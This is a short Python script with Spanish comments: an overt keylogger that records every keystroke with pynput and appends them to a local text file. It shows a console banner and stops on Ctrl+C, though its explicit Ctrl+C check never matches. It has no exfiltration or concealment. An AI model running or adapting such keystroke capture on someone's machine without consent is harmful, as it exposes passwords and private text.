from pynput import keyboard

# Ruta del archivo de texto para almacenar las teclas presionadas
file_path = "teclas1.txt"

# Lista para almacenar las teclas presionadas
teclas_presionadas = []

# Bandera para controlar la captura de teclas
captura_activa = True

# Función para manejar los eventos de pulsaciones de teclado
def on_press(key):
    global captura_activa

    try:
        tecla = key.char
    except AttributeError:
        tecla = str(key)
    teclas_presionadas.append(tecla)

    # Si se presiona la combinación de teclas "Ctrl + C", detener la captura y guardar en el archivo
    if key == keyboard.Key.ctrl and tecla == 'c':
        captura_activa = False

# Crear el objeto Listener para el teclado
keyboard_listener = keyboard.Listener(on_press=on_press)

# Iniciar la escucha de eventos del teclado
keyboard_listener.start()

# Mostrar un mensaje de inicio
print("\033[38;5;88mCapturando teclas. Presiona \033[1;33m'Ctrl + C'\033[0;38;5;88m para detener la captura.")

try:
    # Mantener el programa en un bucle hasta que la captura se detenga
    while captura_activa:
        pass
except KeyboardInterrupt:
    captura_activa = False

# Detener la captura (esto se ejecutará después de presionar "Ctrl + C")
keyboard_listener.stop()

# Guardar las teclas presionadas en el archivo
try:
    with open(file_path, "a") as file:
        file.write("\n".join(teclas_presionadas))
    print("\033[38;5;88mCaptura finalizada. Las teclas presionadas se han almacenado en el archivo:", file_path)
except Exception as e:
    print("Ocurrió un error al guardar las teclas presionadas:", str(e))
